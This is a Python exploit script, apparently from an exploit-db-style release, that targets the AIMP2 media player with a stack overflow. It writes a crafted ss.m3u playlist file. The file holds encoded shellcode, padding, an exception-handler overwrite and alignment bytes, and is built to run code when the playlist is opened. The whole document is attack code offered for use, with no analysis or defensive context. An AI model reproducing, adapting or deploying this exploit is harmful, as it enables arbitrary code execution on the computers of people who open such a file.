#!/usr/bin/python
#
# AIMP2 (aimp2c.exe) m3u malformed open file stack overflow exploit
# Coded by :  Molotov
#
# Greats To : Corelanc0d3r & exploit-db
#
# thanks to : Simo36 & all friends
#
shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARA"
"LAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZA"
"BABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB"
"KLK8U9M0M0KPS0U99UNQ8RS44KPR004K22LLDKR2MD4KCBMX"
"LOGG0JO6NQKOP1WPVLOLQQCLM2NLMPGQ8OLMM197K2ZP22B7"
"TK0RLPTK12OLM1Z04KOPBX55Y0D4OZKQXP0P4KOXMHTKR8MP"
"KQJ3ISOL19TKNTTKM18VNQKONQ90FLGQ8OLMKQY7NXK0T5L4"
"M33MKHOKSMND45JBR84K0XMTKQHSBFTKLL0KTK28MLM18S4K"
"KT4KKQXPSYOTNDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM"
"2JKQTMSU89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU"
"7MEMKOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
"QQ2LRCM0LJA"
)
header = "[playlist]\nNumberOfEntries=3\n\n"
header += ("File1=");
crash = 'A' * 2222
crash+= shellcode
crash+= 'B' * (4014-len(shellcode)-2222)
crash+= '\x41\x6d'
crash+= '\x0e\x45'
align = '\x58\x6d'
align+= '\x58\x6d'
align+= '\x58\x6d'
align+= '\x58\x6d'
align+= '\x05\x01\x11\x6d'
align+= '\x2d\x0F\x11\x6d'
align+= '\x50\x6d\xC3'
padd  = 'D' * 3000
 
padd= 'D'*3000#n7Cn
buffer = header + crash +align+padd +'\n'
file=open('ss.m3u','w')
file.write(buffer)
file.close()
print "[+] ss.m3u file created successfully"
